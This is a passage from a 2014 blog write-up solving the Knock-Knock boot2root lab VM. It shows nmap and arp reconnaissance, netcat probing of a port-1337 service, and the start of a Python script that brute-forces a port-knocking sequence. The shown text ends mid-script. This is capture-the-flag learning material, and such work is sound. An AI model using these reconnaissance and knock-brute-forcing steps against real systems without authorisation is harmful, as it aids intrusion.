
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>knock-knock who’s there? - #!/slash/note</title>
  <meta name="author" content="Leon Jacobs">

  
  <meta name="description" content="introduction Knock-Knock is a vulnerable boot2root VM by @zer0w1re and sure as heck was packed with interesting twists and things to learn! I figured &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44457032-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">#!/slash/note</a></h1>
  
    <h2>A checkbox unchecker's notepad</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:leonjza.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">knock-knock who’s there?</h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-10-14T09:14:26+02:00" pubdate data-updated="true">Oct 14<sup>th</sup>, 2014</time>
        
      </p>
    
  </header>


<div class="entry-content"><h2>introduction</h2>

<p><a href="http://vulnhub.com/series/knock-knock,53/">Knock-Knock</a> is a vulnerable boot2root VM by <a href="https://twitter.com/zer0w1re">@zer0w1re</a> and sure as heck was packed with interesting twists and things to learn!</p>

<p>I figured I&rsquo;d just <em>have a quick look™</em>, and midnight that evening ended up with <em>root</em> privileges :D</p>

<p>As always, if you have not done this VM yet, this post is a massive spoiler and I would highly recommend you close up here and try it first :)
This is my experience &lsquo;knocking&rsquo; on the door.</p>

<!--more-->


<blockquote><p>“Theodore!”</p>

<p>“Theodore who?”</p>

<p>“Theodore wasn&rsquo;t open so I knocked”</p></blockquote>

<h2>getting started</h2>

<p>As always, the vm&rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched <code>arp</code> for any new entries. This presented the first hurdle. A ping scan showed no new IP&rsquo;s in the network range my VM&rsquo;s were in (192.168.56.0/24):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>sudo nmap -sN 192.168.56.0/24
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 09:51 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.1
</span><span class='line'>Host is up <span class="o">(</span>0.000030s latency<span class="o">)</span>.
</span><span class='line'>All 1000 scanned ports on 192.168.56.1 are closed <span class="o">(</span>936<span class="o">)</span> or open<span class="p">|</span>filtered <span class="o">(</span>64<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>1 host up<span class="o">)</span> scanned in 14.99 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Only the gateway was alive. A <code>arp -a</code> however spilled some of the beans:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>arp -i vboxnet0 -a
</span><span class='line'>? <span class="o">(</span>192.168.56.0<span class="o">)</span> at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.1<span class="o">)</span> at a:0:27:0:0:0 on vboxnet0 ifscope permanent <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.2<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>? <span class="o">(</span>192.168.56.201<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.202<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.203<span class="o">)</span> at 8:0:27:be:dd:c8 on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.204<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.205<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>? <span class="o">(</span>192.168.56.255<span class="o">)</span> at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Hello <code>.203</code>! Pinging 192.168.56.203 responded with Destination Port Unreachable messages:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ping -c 2 192.168.56.203
</span><span class='line'>PING 192.168.56.203 <span class="o">(</span>192.168.56.203<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
</span><span class='line'>From 192.168.56.203 <span class="nv">icmp_seq</span><span class="o">=</span>1 Destination Port Unreachable
</span><span class='line'>From 192.168.56.203 <span class="nv">icmp_seq</span><span class="o">=</span>2 Destination Port Unreachable
</span><span class='line'>
</span><span class='line'>--- 192.168.56.203 ping statistics ---
</span><span class='line'>2 packets transmitted, 0 received, +2 errors, 100% packet loss, <span class="nb">time </span>999ms
</span></code></pre></td></tr></table></div></figure>


<p>While a little confusing at first, I figured the firewall was to blame here. I proceeded to focus my attention on this IP and did a normal <code>nmap</code> scan:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sV --reason 192.168.56.203 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 10:03 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0016s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 65534 filtered ports
</span><span class='line'>Reason: 65534 no-responses
</span><span class='line'>PORT     STATE SERVICE REASON  VERSION
</span><span class='line'>1337/tcp open  waste?  syn-ack
</span><span class='line'>
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
</span><span class='line'>SF-Port1337-TCP:V<span class="o">=</span>6.46%I<span class="o">=</span>7%D<span class="o">=</span>10/14%Time<span class="o">=</span>543CEE50%P<span class="o">=</span>i686-pc-linux-gnu%r<span class="o">(</span>NUL
</span><span class='line'>SF:L,15,<span class="s2">&quot;\[12247,\x202759,\x2026802\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,15,<span class="s2">&quot;\[37866,\x202</span>
</span><span class='line'><span class="s2">SF:9242,\x203904\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,15,<span class="s2">&quot;\[29185,\x207368,\x2028937\]\n&quot;</span><span class="o">)</span>%r
</span><span class='line'>SF:<span class="o">(</span>HTTPOptions,15,<span class="s2">&quot;\[55772,\x205315,\x2050180\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,13,<span class="s2">&quot;\[9</span>
</span><span class='line'><span class="s2">SF:301,\x2026341,\x20574\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,16,<span class="s2">&quot;\[34002,\x2046353,\x2023995\</span>
</span><span class='line'><span class="s2">SF:]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReq,16,<span class="s2">&quot;\[47043,\x2037532,\x2024012\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSSt
</span><span class='line'>SF:atusRequest,15,<span class="s2">&quot;\[31914,\x208919,\x2027965\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>Help,15,<span class="s2">&quot;\[63865,\x2</span>
</span><span class='line'><span class="s2">SF:07077,\x2055801\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,15,<span class="s2">&quot;\[30406,\x208520,\x2047713\]\</span>
</span><span class='line'><span class="s2">SF:n&quot;</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,16,<span class="s2">&quot;\[10459,\x2050977,\x2063996\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,16,<span class="s2">&quot;\</span>
</span><span class='line'><span class="s2">SF:[61080,\x2038407,\x2048416\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,15,<span class="s2">&quot;\[61127,\x2058212,\x203</span>
</span><span class='line'><span class="s2">SF:856\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,16,<span class="s2">&quot;\[11007,\x2051452,\x2038765\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>L
</span><span class='line'>SF:PDString,15,<span class="s2">&quot;\[5738,\x2063719,\x2026394\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>LDAPBindReq,14,<span class="s2">&quot;\[14292</span>
</span><span class='line'><span class="s2">SF:,\x20937,\x2020668\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,16,<span class="s2">&quot;\[33684,\x2058491,\x2031373\]</span>
</span><span class='line'><span class="s2">SF:\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>LANDesk-RC,16,<span class="s2">&quot;\[58946,\x2030941,\x2053345\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServe
</span><span class='line'>SF:r,15,<span class="s2">&quot;\[6672,\x2031370,\x2053882\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>NCP,16,<span class="s2">&quot;\[15356,\x2041972,\x20</span>
</span><span class='line'><span class="s2">SF:52087\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>NotesRPC,16,<span class="s2">&quot;\[51444,\x2044303,\x2013901\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>WMSReque
</span><span class='line'>SF:st,13,<span class="s2">&quot;\[87,\x2044952,\x2060309\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>oracle-tns,15,<span class="s2">&quot;\[51073,\x204686</span>
</span><span class='line'><span class="s2">SF:0,\x206777\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>afp,16,<span class="s2">&quot;\[30287,\x2064026,\x2029364\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>kumo-ser
</span><span class='line'>SF:ver,14,<span class="s2">&quot;\[17824,\x2048485,\x20579\]\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 5521.11 seconds
</span></code></pre></td></tr></table></div></figure>


<h2>knock knock&hellip;</h2>

<p><code>tcp/1337</code> was the only open port on the machine. I promptly connected to it to see what we have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -vn 192.168.56.203 1337
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.203<span class="o">]</span> 1337 <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'><span class="o">[</span>6605, 29872, 38566<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>root@kali:~# nc -vn 192.168.56.203 1337
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.203<span class="o">]</span> 1337 <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'><span class="o">[</span>43059, 22435, 17432<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Interesting. Each connection returns a list of numbers. At this stage I should mention that the name of the VM, together with the list of 3 numbers (which look like port numbers as they are always below 65535) had me think that this had to be the sequence in which we have to knock ports to open others.</p>

<p><a href="http://en.wikipedia.org/wiki/Port_knocking">Port knocking</a> generally means that we send a sequence of packets on specific ports so that the listener may perform a certain action when the correct sequence has been &lsquo;knocked&rsquo;. Think of it literally as if someone knocks 3 times at your door and you open up. The only thing is the 3 knocks have to be in a specific order, and if they are not, you will generally ignore the person at the door. It&rsquo;s also important to note that you will also not react to say a single knock. Only those 3 specific ones.</p>

<p>There are plenty of implementations of port knocking out there. My personal favorite being <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> by <a href="https://twitter.com/moxie">@moxie</a>. I have previously played with this implementation and its pretty sweet. A crypted packet is sent to a machine that is logging firewall drops. <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> tails the <code>kern.log</code> and reacts on the correct sequences.</p>

<p>This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.</p>

<h2>&hellip;whos there?</h2>

<p>So with the <code>tcp/1337</code> service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using <code>nmap</code> to scan them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="k">for </span>PORT in 43059 22435 17432<span class="p">;</span> <span class="k">do </span>nmap -PN 192.168.56.203 -p <span class="nv">$PORT</span><span class="p">;</span> <span class="k">done</span>
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:25 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up.
</span><span class='line'>PORT      STATE    SERVICE
</span><span class='line'>43059/tcp filtered unknown
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 2.06 seconds
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:25 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up.
</span><span class='line'>PORT      STATE    SERVICE
</span><span class='line'>22435/tcp filtered unknown
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 2.13 seconds
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:25 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up.
</span><span class='line'>PORT      STATE    SERVICE
</span><span class='line'>17432/tcp filtered unknown
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 2.07 seconds
</span></code></pre></td></tr></table></div></figure>


<p>With that done, I rescanned the box for any new open ports but nothing was different. I retried the <code>nmap</code> loop just to make sure, but it did not appear to make a difference.</p>

<p>Remembering that the sequence changed every time you connected to the <code>tcp/1337</code> service, I figured it may change some configuration on the server to accept a new sequence. So, I re-connected to the <code>tcp/1337</code> service, and looped over the new sequence. Still, nothing. At this stage a was starting to feel relatively lost as to what may be happening. I returned to doing some research on some implementations of this knock knock concept and came across <a href="https://github.com/jvinet/knock">knockd</a>. I downloaded the <a href="https://github.com/jvinet/knock/blob/master/src/knock.c">client</a> and compiled locally with <code>gcc knock.c -o knock</code> and tested to see if this makes any difference.</p>

<p>Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.</p>

<h2>22 and 80 too</h2>

<p>The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the <code>tcp/1337</code> service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt;&gt;&gt; <span class="nv">ip</span><span class="o">=</span>IP<span class="o">(</span><span class="nv">dst</span><span class="o">=</span><span class="s2">&quot;192.168.56.203&quot;</span><span class="o">)</span>
</span><span class='line'>&gt;&gt;&gt; <span class="nv">SYN</span><span class="o">=</span>TCP<span class="o">(</span><span class="nv">dport</span><span class="o">=</span>40508,flags<span class="o">=</span><span class="s2">&quot;S&quot;</span><span class="o">)</span>
</span><span class='line'>&gt;&gt;&gt; send<span class="o">(</span>ip/SYN<span class="o">)</span>
</span><span class='line'>.
</span><span class='line'>Sent 1 packets.
</span><span class='line'>&gt;&gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>After quite some time, suddenly, nmap reports <code>tcp/22</code> and <code>tcp/80</code> as open&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.203
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:40 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 998 filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>80/tcp open  http
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 4.98 seconds
</span></code></pre></td></tr></table></div></figure>


<p><strong>W.T.F.</strong> I actually had no idea why this worked. I had some theories, but based on the amount of testing I did, I figured that I effectively brute-forced my way in.</p>

<p>With the ports now open, I did shuffle some ideas with a few people, and it came out the the sequence may be randomized. With that in mind, I decided to slap together a python script that will try all of the possible sequences and knock all of them, hoping that one of them is eventually the correct one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">destination</span> <span class="o">=</span> <span class="s">&quot;192.168.56.203&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">clean_up_ports</span><span class="p">(</span><span class="n">raw_string</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot; Clean up the raw string received on the socket&quot;&quot;&quot;</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw_string</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">None</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Remove the first [</span>
</span><span class='line'>    <span class="n">raw_string</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;[&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># Remove the second ]</span>
</span><span class='line'>    <span class="n">raw_string</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;]&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># split by commas</span>
</span><span class='line'>    <span class="n">first_list</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># start e empty return list</span>
</span><span class='line'>    <span class="n">ports</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">first_list</span><span class="p">:</span>
</span><span class='line'>        <span class="c"># strip the whitespace around the string</span>
</span><span class='line'>        <span class="c"># and cast to a integer</span>
</span><span class='line'>        <span class="n">ports</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span>  <span class="n">ports</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Getting sequence&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">destination</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>
</span><span class='line'>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Unable to connect to </span><span class="si">%s</span><span class="s"> on port 1337. </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">destination</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># receive the list</span>
